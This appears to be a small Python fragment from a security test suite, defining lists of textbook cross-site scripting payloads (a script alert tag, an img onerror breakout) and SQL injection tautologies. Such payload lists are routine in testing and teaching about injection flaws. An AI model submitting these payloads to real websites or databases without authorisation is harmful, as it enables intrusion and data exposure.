XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"'><img src=x onerror=alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
]
